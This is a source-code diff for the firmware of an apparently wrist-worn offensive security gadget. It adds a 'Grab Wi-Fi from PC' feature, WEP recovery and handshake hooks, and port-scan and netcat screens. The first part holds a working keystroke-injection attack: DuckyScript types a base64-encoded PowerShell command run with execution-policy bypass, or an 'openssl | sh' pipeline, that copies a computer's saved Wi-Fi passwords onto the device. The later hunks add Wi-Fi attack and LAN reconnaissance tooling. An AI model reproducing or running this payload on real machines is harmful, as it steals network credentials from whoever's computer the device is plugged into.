+    "if [ -n \"$psk\" ];then printf 'ssid=%s\\nsecurity=WPA2\\npsk=%s\\n' \"$ssid\" \"$psk\">\"$dir/$nm.net\";else printf 'ssid=%s\\nsecurity=open\\n' \"$ssid\">\"$dir/$nm.net\";fi\n"
+    "w=$((w+1))\n"
+    "done\n"
+    "echo \"NocSif: wrote $w networks to $dir. Done - you can close this window.\"\n"
+    "sleep 10\n";
+
+/* Linux POSIX sh (same base64|openssl|sh delivery). Lists NetworkManager wireless connections with nmcli;
+ * `nmcli -s` returns the PSK where the active session is authorized (else the network is written SSID-only).
+ * Polls the common removable-mount roots. Ctrl+Alt+T (the typed opener) is GNOME-family; other desktops
+ * may not open a terminal — that is the one unavoidable per-distro caveat. */
+static const char GRAB_LINUX_SCRIPT[] =
+    "dir=\"\";i=0\n"
+    "while [ $i -lt 90 ];do\n"
+    "for m in /media/*/*/nocsif /run/media/*/*/nocsif /media/*/nocsif;do [ -d \"$m\" ]&&dir=\"${m%/nocsif}/nocsif/Networks\"&&break;done\n"
+    "[ -n \"$dir\" ]&&break\n"
+    "i=$((i+1));sleep 1\n"
+    "done\n"
+    "[ -z \"$dir\" ]&&{ echo 'NocSif: no File Share drive found';sleep 6;exit;}\n"
+    "mkdir -p \"$dir\";w=0\n"
+    "IFS='\n'\n"
+    "for name in $(nmcli -t -f NAME,TYPE connection show 2>/dev/null|awk -F: '$2 ~ /wireless/{print $1}');do\n"
+    "ssid=$(nmcli -t -g 802-11-wireless.ssid connection show \"$name\" 2>/dev/null)\n"
+    "[ -z \"$ssid\" ]&&ssid=\"$name\"\n"
+    "psk=$(nmcli -s -t -g 802-11-wireless-security.psk connection show \"$name\" 2>/dev/null)\n"
+    "nm=$(printf %s \"$ssid\"|tr -c 'A-Za-z0-9._ -' _)\n"
+    "if [ -n \"$psk\" ];then printf 'ssid=%s\\nsecurity=WPA2\\npsk=%s\\n' \"$ssid\" \"$psk\">\"$dir/$nm.net\";else printf 'ssid=%s\\nsecurity=open\\n' \"$ssid\">\"$dir/$nm.net\";fi\n"
+    "w=$((w+1))\n"
+    "done\n"
+    "echo \"NocSif: wrote $w networks to $dir. Done - you can close this window.\"\n"
+    "sleep 10\n";
+
+/* Standard base64 (padded) of `in`; writes a NUL-terminated string to `out`. out must hold
+ * ((n+2)/3)*4 + 1 bytes. Returns the encoded length (excluding NUL). */
+static size_t grab_b64(const uint8_t *in, size_t n, char *out)
+{
+    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    size_t o = 0, i = 0;
+    for (; i + 3 <= n; i += 3) {
+        uint32_t v = ((uint32_t)in[i] << 16) | ((uint32_t)in[i + 1] << 8) | in[i + 2];
+        out[o++] = T[(v >> 18) & 63]; out[o++] = T[(v >> 12) & 63];
+        out[o++] = T[(v >> 6) & 63];  out[o++] = T[v & 63];
+    }
+    size_t rem = n - i;
+    if (rem == 1) {
+        uint32_t v = (uint32_t)in[i] << 16;
+        out[o++] = T[(v >> 18) & 63]; out[o++] = T[(v >> 12) & 63]; out[o++] = '='; out[o++] = '=';
+    } else if (rem == 2) {
+        uint32_t v = ((uint32_t)in[i] << 16) | ((uint32_t)in[i + 1] << 8);
+        out[o++] = T[(v >> 18) & 63]; out[o++] = T[(v >> 12) & 63]; out[o++] = T[(v >> 6) & 63]; out[o++] = '=';
+    }
+    out[o] = '\0';
+    return o;
+}
+
+/* Build the DuckyScript for `os` (heap; caller frees): open the OS's shell, then run the payload as base64.
+ * Windows encodes UTF-16LE for `powershell -EncodedCommand`; macOS/Linux base64 the raw sh bytes and pipe
+ * through `openssl enc -base64 -A -d|sh`. Returns NULL on OOM. */
+static char *grab_build_ducky(grab_os_t os)
+{
+    const char *script = (os == GRAB_OS_WIN) ? GRAB_PS_SCRIPT
+                       : (os == GRAB_OS_MAC) ? GRAB_MAC_SCRIPT : GRAB_LINUX_SCRIPT;
+    size_t slen = strlen(script);
+
+    /* Bytes to base64: UTF-16LE for PowerShell -EncodedCommand, raw UTF-8 for the openssl|sh pipe. */
+    size_t blen = (os == GRAB_OS_WIN) ? slen * 2 : slen;
+    uint8_t *bytes = (uint8_t *)malloc(blen ? blen : 1);
+    if (bytes == NULL) return NULL;
+    if (os == GRAB_OS_WIN) {
+        for (size_t i = 0; i < slen; i++) { bytes[2 * i] = (uint8_t)script[i]; bytes[2 * i + 1] = 0; }
+    } else {
+        memcpy(bytes, script, slen);
+    }
+    char *b64 = (char *)malloc(((blen + 2) / 3) * 4 + 1);
+    if (b64 == NULL) { free(bytes); return NULL; }
+    grab_b64(bytes, blen, b64);
+    free(bytes);
+
+    /* Opener + payload wrapper per OS. Trailing DELAY lets the final ENTER flush before the HID->MSC switch. */
+    const char *pre, *post;
+    switch (os) {
+    case GRAB_OS_MAC:
+        pre  = "DELAY 900\nGUI SPACE\nDELAY 800\nSTRING Terminal\nDELAY 700\nENTER\nDELAY 2400\nSTRING echo ";
+        post = "|openssl enc -base64 -A -d|sh\nENTER\nDELAY 900\n";
+        break;
+    case GRAB_OS_LINUX:
+        pre  = "DELAY 900\nCTRL ALT t\nDELAY 2400\nSTRING echo ";
+        post = "|openssl enc -base64 -A -d|sh\nENTER\nDELAY 900\n";
+        break;
+    case GRAB_OS_WIN:
+    default:
+        pre  = "DELAY 900\nGUI r\nDELAY 700\nSTRING cmd\nENTER\nDELAY 1600\n"
+               "STRING powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ";
+        post = "\nENTER\nDELAY 900\n";
+        break;
+    }
+    size_t total = strlen(pre) + strlen(b64) + strlen(post) + 1;
+    char *out = (char *)malloc(total);
+    if (out == NULL) { free(b64); return NULL; }
+    snprintf(out, total, "%s%s%s", pre, b64, post);
+    free(b64);
+    return out;
+}
+
+typedef enum {
+    GRAB_IDLE = 0,
+    GRAB_HID_WAIT,     /* requested HID, waiting for the endpoint to enumerate                 */
+    GRAB_TYPING,       /* run_text fired; the watch is typing the command on the PC            */
+    GRAB_SHARING,      /* File Share up; the PC's PowerShell is copying networks onto the card  */
+    GRAB_IMPORTING,    /* reclaiming the card + counting what landed                            */
+    GRAB_DONE,
+    GRAB_ERR,
+} grab_state_t;
+
+static lv_obj_t   *s_grab_scr;
+static lv_obj_t   *s_grab_status;    /* big step label                    */
+static lv_obj_t   *s_grab_hint;      /* secondary hint                    */
+static lv_obj_t   *s_grab_spin;      /* spinner, shown while in-flight    */
+static lv_obj_t   *s_grab_starts[3]; /* per-OS Start rows (Win/mac/Linux)  */
+static lv_obj_t   *s_grab_import;    /* Import now row (shown while sharing) */
+static grab_state_t s_grab_state;
+static grab_os_t   s_grab_os;        /* the target picked for this run     */
+static uint32_t    s_grab_t0;        /* state-entry tick (ms) for timeouts */
+static int         s_grab_baseline;  /* .net count before the run          */
+static bool        s_grab_saw_running;/* saw ducky RUNNING (guards a stale DONE from a prior run) */
+static char        s_grab_msg[160];
+
+static bool grab_in_flight(void)
+{
+    return s_grab_state == GRAB_HID_WAIT || s_grab_state == GRAB_TYPING ||
+           s_grab_state == GRAB_SHARING  || s_grab_state == GRAB_IMPORTING;
+}
+
+/* Show/hide the three OS Start rows together (hidden while a run is in flight). */
+static void grab_show_starts(bool show)
+{
+    for (int i = 0; i < 3; i++) {
+        if (!s_grab_starts[i]) continue;
+        if (show) lv_obj_clear_flag(s_grab_starts[i], LV_OBJ_FLAG_HIDDEN);
+        else      lv_obj_add_flag(s_grab_starts[i], LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
+static void grab_set(const char *big, const char *hint, bool spin)
+{
+    if (s_grab_status && big)  gf_set(s_grab_status, big);
+    if (s_grab_hint && hint)   gf_set(s_grab_hint, hint);
+    if (s_grab_spin) {
+        if (spin) lv_obj_clear_flag(s_grab_spin, LV_OBJ_FLAG_HIDDEN);
+        else      lv_obj_add_flag(s_grab_spin, LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
+/* Count the .net files in the Networks folder (net_list claims the card + reads + releases). -1 on OOM. */
+static int grab_count_nets(void)
+{
+    char (*names)[NOCSIF_NET_NAME_MAX] = malloc((size_t)NOCSIF_NET_LIST_MAX * NOCSIF_NET_NAME_MAX);
+    if (names == NULL) return -1;
+    int n = nocsif_net_list(names, NOCSIF_NET_LIST_MAX);
+    free(names);
+    return n;
+}
+
+static void grab_fail(const char *why)
+{
+    snprintf(s_grab_msg, sizeof s_grab_msg, "%s", why);
+    grab_set("Couldn't finish", s_grab_msg, false);
+    s_grab_state = GRAB_ERR;
+    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_DETACHED);
+    if (s_grab_import) lv_obj_add_flag(s_grab_import, LV_OBJ_FLAG_HIDDEN);
+    grab_show_starts(true);
+}
+
+/* Reclaim the card from the host, count what the PC wrote, and end File Share. */
+static void grab_do_import(void)
+{
+    s_grab_state = GRAB_IMPORTING;
+    grab_set("Importing", "reading the card...", true);
+    if (s_grab_import) lv_obj_add_flag(s_grab_import, LV_OBJ_FLAG_HIDDEN);
+
+    int total = grab_count_nets();
+    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_DETACHED);   /* end File Share cleanly */
+
+    if (total <= 0) {
+        grab_set("Nothing imported",
+                 "No networks on the card. Did the PC's command window finish, and is the layout "
+                 "US? On macOS/Linux a denied password prompt yields no networks.", false);
+        s_grab_state = GRAB_ERR;
+    } else {
+        int added = total - s_grab_baseline;
+        if (added < 0) added = 0;
+        snprintf(s_grab_msg, sizeof s_grab_msg,
+                 "%d network%s saved (%d new) " NOCSIF_DOT " open Saved Networks to connect",
+                 total, total == 1 ? "" : "s", added);
+        grab_set("Done", s_grab_msg, false);
+        s_grab_state = GRAB_DONE;
+    }
+    grab_show_starts(true);
+}
+
+static void grab_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_grab_scr == NULL) return;
+    /* Keep the watch awake for the whole run: the operator watches the PC, not the watch, so with no
+     * touch the panel would auto-sleep — the screen timeout, or "sleep-when-still" after 30 s flat +
+     * motionless (exactly a watch sitting plugged in) — which stalls the grab. Resetting the LVGL
+     * activity timer each tick holds both sleep paths off; normal timeout resumes once we leave flight. */
+    if (grab_in_flight()) {
+        lv_display_trigger_activity(NULL);
+    }
+    switch (s_grab_state) {
+    case GRAB_HID_WAIT:
+        if (nocsif_usb_gadget_hid_ready()) {
+            char *dk = grab_build_ducky(s_grab_os);
+            if (dk == NULL) { grab_fail("out of memory building the command"); break; }
+            nocsif_ducky_request_run_text(dk, NOCSIF_DUCKY_SINK_USB);
+            free(dk);
+            s_grab_saw_running = false;
+            s_grab_state = GRAB_TYPING;
+            s_grab_t0 = lv_tick_get();
+            const char *typing_hint =
+                (s_grab_os == GRAB_OS_MAC)   ? "Spotlight opens Terminal " NOCSIF_DOT " approve any Keychain prompt" :
+                (s_grab_os == GRAB_OS_LINUX) ? "a terminal opens (Ctrl+Alt+T) " NOCSIF_DOT " approve any password prompt" :
+                                               "a command window opens and runs PowerShell " NOCSIF_DOT " don't touch it";
+            grab_set("Typing on the PC", typing_hint, true);
+        } else if (lv_tick_elaps(s_grab_t0) > 9000) {
+            grab_fail("USB keyboard didn't come up. Is the watch plugged into the PC?");
+        }
+        break;
+    case GRAB_TYPING: {
+        nocsif_ducky_state_t ds = nocsif_ducky_state();
+        if (ds == NOCSIF_DUCKY_RUNNING) {
+            s_grab_saw_running = true;
+        } else if (s_grab_saw_running && ds == NOCSIF_DUCKY_DONE) {
+            nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_MSC);     /* now hand the card to the PC */
+            s_grab_state = GRAB_SHARING;
+            s_grab_t0 = lv_tick_get();
+            grab_set("Sharing the card",
+                     "the PC is copying your networks " NOCSIF_DOT " tap Import when its window says Done", true);
+            if (s_grab_import) lv_obj_clear_flag(s_grab_import, LV_OBJ_FLAG_HIDDEN);
+        } else if (ds == NOCSIF_DUCKY_ERR_HID_DOWN || ds == NOCSIF_DUCKY_ERR_NOMEM) {
+            grab_fail("couldn't type the command (USB HID not ready)");
+        } else if (lv_tick_elaps(s_grab_t0) > 150000) {
+            /* Failsafe only — normal completion is the DONE transition above. The ~3.5 KB base64 is
+             * typed a key at a time, and the host's HID poll cadence can stretch that on a slow PC. */
+            grab_fail("typing timed out");
+        }
+        break;
+    }
+    case GRAB_SHARING:
+        /* Hands-off fallback: auto-import after a generous window. The PC writes within a few seconds of
+         * the drive appearing, so this only fires if the operator never taps Import. */
+        if (lv_tick_elaps(s_grab_t0) > 35000) {
+            grab_do_import();
+        }
+        break;
+    default:
+        break;
+    }
+}
+
+static void grab_start(grab_os_t os)
+{
+    if (grab_in_flight()) return;
+    if (!nocsif_ui_require_sd()) return;
+    nocsif_net_ensure_readme();                 /* guarantees /sd/nocsif/Networks — the PC's drive marker */
+    int base = grab_count_nets();
+    s_grab_baseline = base > 0 ? base : 0;
+    s_grab_os = os;
+    s_grab_saw_running = false;
+    s_grab_state = GRAB_HID_WAIT;
+    s_grab_t0 = lv_tick_get();
+    grab_set("Connecting as a keyboard", "keep the watch plugged into the PC", true);
+    grab_show_starts(false);
+    if (s_grab_import) lv_obj_add_flag(s_grab_import, LV_OBJ_FLAG_HIDDEN);
+    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_HID);
+}
+static void grab_start_win_cb(lv_event_t *e)   { (void)e; grab_start(GRAB_OS_WIN); }
+static void grab_start_mac_cb(lv_event_t *e)   { (void)e; grab_start(GRAB_OS_MAC); }
+static void grab_start_linux_cb(lv_event_t *e) { (void)e; grab_start(GRAB_OS_LINUX); }
+
+static void grab_import_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_grab_state == GRAB_SHARING) grab_do_import();
+}
+
+static void grab_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *tm = (lv_timer_t *)lv_event_get_user_data(e);
+    if (tm) lv_timer_delete(tm);
+    if (grab_in_flight()) {
+        nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_DETACHED);   /* don't leave HID/MSC hanging */
+    }
+    s_grab_scr = NULL; s_grab_status = NULL; s_grab_hint = NULL;
+    s_grab_spin = NULL; s_grab_import = NULL;
+    s_grab_starts[0] = s_grab_starts[1] = s_grab_starts[2] = NULL;
+    s_grab_state = GRAB_IDLE;
+}
+
+static lv_obj_t *build_wifi_grab(void)
+{
+    nocsif_ducky_init();   /* lazy: the ducky worker plays the typed command */
+
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(
+        "Grab Wi-Fi from PC", "import a PC's saved networks " NOCSIF_DOT " over USB", &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    s_grab_scr = scr;
+    s_grab_state = GRAB_IDLE;
+
+    lv_obj_t *intro = lv_label_create(content);
+    lv_label_set_text(intro,
+        "Plug the watch into a PC, then tap its OS. The watch types a command that copies the PC's "
+        "saved Wi-Fi networks onto the card " NOCSIF_DOT " no PC software needed.");
+    lv_label_set_long_mode(intro, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(intro, lv_pct(100));
+    lv_obj_add_style(intro, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(intro, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_bottom(intro, 12, 0);
+
+    /* status row: [spinner] big step label */
+    lv_obj_t *statrow = lv_obj_create(content);
+    lv_obj_remove_style_all(statrow);
+    lv_obj_set_width(statrow, lv_pct(100));
+    lv_obj_set_height(statrow, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(statrow, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(statrow, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(statrow, 8, 0);
+    lv_obj_clear_flag(statrow, LV_OBJ_FLAG_SCROLLABLE);
+
+    s_grab_spin = lv_spinner_create(statrow);
+    lv_spinner_set_anim_params(s_grab_spin, 1000, 60);
+    lv_obj_set_size(s_grab_spin, 18, 18);
+    lv_obj_set_style_arc_width(s_grab_spin, 3, LV_PART_MAIN);
+    lv_obj_set_style_arc_width(s_grab_spin, 3, LV_PART_INDICATOR);
+    lv_obj_set_style_arc_color(s_grab_spin, NOCSIF_EDGE, LV_PART_MAIN);
+    lv_obj_set_style_arc_color(s_grab_spin, NOCSIF_VIOLET, LV_PART_INDICATOR);
+    lv_obj_remove_flag(s_grab_spin, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_add_flag(s_grab_spin, LV_OBJ_FLAG_HIDDEN);        /* idle until a run starts */
+
+    s_grab_status = lv_label_create(statrow);
+    lv_label_set_long_mode(s_grab_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_flex_grow(s_grab_status, 1);
+    lv_obj_add_style(s_grab_status, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(s_grab_status, NOCSIF_VIOLET, 0);
+    lv_label_set_text(s_grab_status, "Ready");
+
+    s_grab_hint = lv_label_create(content);
+    lv_label_set_long_mode(s_grab_hint, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_grab_hint, lv_pct(100));
+    lv_obj_add_style(s_grab_hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_grab_hint, NOCSIF_STEEL, 0);
+    lv_obj_set_style_pad_top(s_grab_hint, 4, 0);
+    lv_obj_set_style_pad_bottom(s_grab_hint, 10, 0);
+    lv_label_set_text(s_grab_hint, "pick the plugged-in PC's operating system");
+
+    nocsif_band(content, "START ON");
+    lv_obj_t *list = nocsif_menu_list(content);
+    s_grab_starts[0] = wifi_menu_row(list, "Windows", NOCSIF_BONE, NULL, NULL, grab_start_win_cb,   NULL);
+    s_grab_starts[1] = wifi_menu_row(list, "macOS",   NOCSIF_BONE, NULL, NULL, grab_start_mac_cb,   NULL);
+    s_grab_starts[2] = wifi_menu_row(list, "Linux",   NOCSIF_BONE, NULL, NULL, grab_start_linux_cb, NULL);
+    s_grab_import = wifi_menu_row(list, "Import now", NOCSIF_BONE, NULL, NULL, grab_import_cb, NULL);
+    lv_obj_add_flag(s_grab_import, LV_OBJ_FLAG_HIDDEN);
+
+    lv_obj_t *note = lv_label_create(content);
+    lv_label_set_text(note,
+        "US keyboard layout " NOCSIF_DOT " Windows is silent; macOS/Linux may prompt for your password to "
+        "read Wi-Fi keys (names still import). A command window appears on the PC. Authorized PCs only.");
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_obj_add_style(note, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(note, 14, 0);
+
+    lv_timer_t *tm = lv_timer_create(grab_tick, 300, NULL);
+    lv_obj_add_event_cb(scr, grab_deleted_cb, LV_EVENT_DELETE, tm);
     return scr;
 }
 
@@ -3976,6 +4499,9 @@ static int       s_ap_page;   /* which page of AP_ROWS is currently shown; tappi
 typedef struct { uint8_t bssid[6]; char name[33]; uint8_t channel; bool valid; } wifi_target_t;
 static wifi_target_t s_hunt_wifi_pending;   /* Live Networks → Signal Hunt (WiFi AP)               */
 static wifi_target_t s_hs_target;           /* Live Networks → Handshake capture (channel-locked)  */
+static wifi_target_t s_wep_target;          /* Live Networks → WEP key recovery (channel-locked)   */
+static char          s_wep_ssid_ui[33];     /* the target's real SSID (for the auto-join)          */
+static int           s_wep_ui_keylen;       /* 0 = auto / 5 / 13 (user toggle)                     */
 static nocsif_wifi_mon_ap_t s_apd;          /* full snapshot of the AP the detail screen is about  */
 static bool          s_apd_valid;
 static lv_obj_t *build_wifi_ap_detail(void);   /* per-network detail + actions (#2)                 */
@@ -4399,7 +4925,12 @@ static void wifi_apd_pmkid_cb(lv_event_t *e)
 static void wifi_apd_wep_cb(lv_event_t *e)
 {
     (void)e;
-    nocsif_toast("WEP key recovery lands in a later build");   /* entry point wired; engine parked (#4) */
+    memcpy(s_wep_target.bssid, s_apd.bssid, 6);
+    snprintf(s_wep_target.name, sizeof s_wep_target.name, "%s", s_apd.ssid[0] ? s_apd.ssid : "(hidden)");
+    snprintf(s_wep_ssid_ui, sizeof s_wep_ssid_ui, "%s", s_apd.ssid);   /* real SSID ("" = hidden) */
+    s_wep_target.channel = s_apd.channel;
+    s_wep_target.valid   = true;
+    nocsif_nav_push(build_wifi_wep_recover());   /* channel-locked to this AP */
 }
 static void wifi_apd_deauth_cb(lv_event_t *e)
 {
@@ -5256,13 +5787,1790 @@ static void wifi_pcap_tick(lv_timer_t *t)
     }
 }
 
+/* ============================ WiFi #6: Network Tools =============================== *
+ * On-LAN tooling over the STA link (lwIP sockets in nettools.c; no radio I/O). A hub drills into
+ * Discover Hosts (ICMP sweep + ARP/OUI/NBNS enrichment), a per-host TCP connect-scan + banner, a
+ * targeted ping, and "nmap"/"masscan" PRESETS that drive the same two primitives — emulated option
+ * sets, NOT the real tools (the on-watch copy says so). These screens only READ published state +
+ * POST requests; every capability is gated on a live link. */
+
+#define NT_N(a) ((int)(sizeof(a) / sizeof((a)[0])))
+
+/* Curated port sets (each drives the connect-scan primitive; all within NOCSIF_NT_PORTS_IN). */
+static const uint16_t k_nt_quick[]   = { 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 };
+static const uint16_t k_nt_web[]     = { 80,81,88,443,591,2082,2087,3000,5000,8000,8008,8080,8081,8443,8888,9000,9090,9443 };
+static const uint16_t k_nt_win[]     = { 53,88,135,139,389,445,464,636,3268,3269,3389,5985,5986 };
+static const uint16_t k_nt_db[]      = { 1433,1521,1830,3306,5432,5984,6379,7000,7199,8086,9042,9200,11211,27017,27018 };
+static const uint16_t k_nt_top60[]   = { 7,20,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,554,587,631,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,1720,1723,1755,1900,2000,2001,2049,2121 };
+static const uint16_t k_nt_top100[]  = { 7,20,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,554,587,631,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,1720,1723,1755,1900,2000,2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000,6001,6646,7070,8000,8008,8009,8080,8081,8443,8888,9100,9999,10000,32768,49152,49153,49154,49155,49156,49157 };
+static const uint16_t k_nt_webwide[] = { 80,81,88,443,591,2082,2087,2095,2096,3000,4443,4567,5000,5800,7001,8000,8008,8009,8080,8081,8088,8090,8443,8888,9000,9090,9443,10000 };
+
+typedef struct { const char *name; const uint16_t *ports; int n; } nt_preset_t;
+/* One "Port Scan" menu (we don't run nmap/masscan — it's the on-watch TCP connect-scan; the honest
+ * name is just a port scan with a chosen port set). */
+static const nt_preset_t k_nt_portscan[] = {
+    { "Quick (top 20)",  k_nt_quick,   NT_N(k_nt_quick)   },
+    { "Web services",    k_nt_web,     NT_N(k_nt_web)     },
+    { "Windows / AD",    k_nt_win,     NT_N(k_nt_win)     },
+    { "Databases",       k_nt_db,      NT_N(k_nt_db)      },
+    { "Full (top 60)",   k_nt_top60,   NT_N(k_nt_top60)   },
+    { "Fast (top 100)",  k_nt_top100,  NT_N(k_nt_top100)  },
+    { "Web (wide)",      k_nt_webwide, NT_N(k_nt_webwide) },
+};
+
+/* Shared screen state. */
+static uint32_t        s_nt_target;                 /* the host the entry / modal is aimed at   */
+static uint8_t         s_nt_entry_mode;             /* 0 = ping · 1 = scan                       */
+static const uint16_t *s_nt_entry_ports;            /* scan port set consumed by the entry action*/
+static int             s_nt_entry_n;
+static lv_obj_t       *s_nt_ov;                     /* host-action modal overlay                 */
+
+static lv_obj_t *build_nt_hosts(void);
+static lv_obj_t *build_nt_scan(void);
+static lv_obj_t *build_nt_device(void);             /* deep-dive: fingerprint + ports + services */
+static lv_obj_t *build_nt_hostentry(void);
+static lv_obj_t *build_nt_presets(int kind);        /* 0 = nmap · 1 = masscan */
+static lv_obj_t *build_nt_dns(void);                /* DNS toolkit */
+static lv_obj_t *build_nt_trace(void);              /* traceroute */
+static lv_obj_t *build_nt_discover(void);           /* SSDP / mDNS service discovery */
+static lv_obj_t *build_nt_netcat(void);             /* netcat setup */
+static lv_obj_t *build_nt_nc_console(void);         /* netcat console */
+static lv_obj_t *build_nt_http(void);               /* HTTP + TLS recon setup */
+static lv_obj_t *build_nt_craft(void);              /* packet crafter setup */
+static lv_obj_t *build_nt_report(void);             /* shared report (HTTP recon / crafter) */
+
+/* "a.b.c." prefix from the current STA link, for seeding the host-entry field (else ""). */
+static void nt_seed_prefix(char *out, size_t len)
+{
+    uint32_t ip = 0;
+    if (out && len) out[0] = '\0';
+    if (nocsif_nettools_link(&ip, NULL, NULL))
+        snprintf(out, len, "%u.%u.%u.", (unsigned)((ip >> 24) & 0xFF),
+                 (unsigned)((ip >> 16) & 0xFF), (unsigned)((ip >> 8) & 0xFF));
+}
+
+/* A thin progress bar (0..100). */
+static lv_obj_t *nt_progress_bar(lv_obj_t *parent)
+{
+    lv_obj_t *bar = lv_bar_create(parent);
+    lv_obj_set_size(bar, lv_pct(100), 4);
+    lv_obj_set_style_pad_ver(bar, 6, 0);
+    lv_bar_set_range(bar, 0, 100);
+    lv_bar_set_value(bar, 0, LV_ANIM_OFF);
+    lv_obj_set_style_bg_color(bar, NOCSIF_EDGE, LV_PART_MAIN);
+    lv_obj_set_style_bg_opa(bar, LV_OPA_COVER, LV_PART_MAIN);
+    lv_obj_set_style_radius(bar, 2, LV_PART_MAIN);
+    lv_obj_set_style_bg_color(bar, NOCSIF_VIOLET, LV_PART_INDICATOR);
+    lv_obj_set_style_bg_opa(bar, LV_OPA_COVER, LV_PART_INDICATOR);
+    lv_obj_set_style_radius(bar, 2, LV_PART_INDICATOR);
+    return bar;
+}
+
+/* ---- Network Tools button style (dark: transparent fill + thin gray border + gray text) ----------
+ * Scoped to the tools screens for the UI refresh; the shared tools_btn (used app-wide) is untouched.
+ * Width fits the label (+ padding) so it never clips at any type-scale. Label uses row_name -> scales. */
+static lv_obj_t *nt_btn(lv_obj_t *parent, const char *text, lv_event_cb_t cb)
+{
+    lv_obj_t *b = lv_obj_create(parent);
+    lv_obj_remove_style_all(b);
+    lv_obj_set_size(b, LV_SIZE_CONTENT, LV_SIZE_CONTENT);
+    lv_obj_set_style_pad_hor(b, 16, 0);
+    lv_obj_set_style_pad_ver(b, 10, 0);
+    lv_obj_set_style_radius(b, 8, 0);
+    lv_obj_set_style_bg_opa(b, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(b, 1, 0);
+    lv_obj_set_style_border_color(b, NOCSIF_EDGE2, 0);
+    lv_obj_add_flag(b, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_clear_flag(b, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_style(b, &nocsif_style_row_press, LV_STATE_PRESSED);
+    lv_obj_add_event_cb(b, cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *l = lv_label_create(b);
+    lv_label_set_text(l, text);
+    lv_obj_center(l);
+    lv_obj_add_style(l, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(l, NOCSIF_WHITE, 0);
+    return b;
+}
+
+/* The big keyboard action button (Ping / Set / Run / Send / Trace / Scan …) in the same dark style,
+ * pinned above the on-screen keyboard exactly like nocsif_kb_action (which stays gold for the rest of
+ * the app). */
+static lv_obj_t *nt_action_btn(lv_obj_t *scr, const char *label, lv_event_cb_t cb, void *user)
+{
+    lv_obj_t *b = lv_obj_create(scr);
+    lv_obj_remove_style_all(b);
+    lv_obj_add_flag(b, LV_OBJ_FLAG_IGNORE_LAYOUT);
+    lv_obj_set_width(b, 300);
+    lv_obj_set_height(b, LV_SIZE_CONTENT);
+    lv_obj_align(b, LV_ALIGN_BOTTOM_MID, 0, NOCSIF_KB_BTN_Y);
+    lv_obj_set_style_bg_opa(b, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_color(b, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(b, 1, 0);
+    lv_obj_set_style_radius(b, 8, 0);
+    lv_obj_set_style_pad_ver(b, 11, 0);
+    lv_obj_clear_flag(b, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_flag(b, LV_OBJ_FLAG_CLICKABLE);
+    lv_obj_add_flag(b, LV_OBJ_FLAG_GESTURE_BUBBLE);
+    lv_obj_add_style(b, &nocsif_style_row_press, LV_STATE_PRESSED);
+    lv_obj_t *l = lv_label_create(b);
+    lv_label_set_text(l, label);
+    lv_obj_center(l);
+    lv_obj_add_style(l, &nocsif_style_row_name, 0);
+    lv_obj_set_style_text_color(l, NOCSIF_WHITE, 0);
+    lv_obj_add_event_cb(b, cb, LV_EVENT_CLICKED, user);
+    return b;
+}
+
+/* A result line as a clean row: scaling text + a hairline divider below. Replaces the old fixed-font
+ * wrapped labels (mono_13/14) that read like raw console output and never grew with the type scale. */
+static lv_obj_t *nt_line_row(lv_obj_t *list, const char *text, lv_color_t color)
+{
+    lv_obj_t *row = lv_obj_create(list);
+    lv_obj_remove_style_all(row);
+    lv_obj_set_width(row, lv_pct(100));
+    lv_obj_set_height(row, LV_SIZE_CONTENT);
+    lv_obj_set_style_pad_ver(row, 8, 0);
+    lv_obj_set_style_border_side(row, LV_BORDER_SIDE_BOTTOM, 0);
+    lv_obj_set_style_border_width(row, 1, 0);
+    lv_obj_set_style_border_color(row, NOCSIF_EDGE, 0);
+    lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_t *l = lv_label_create(row);
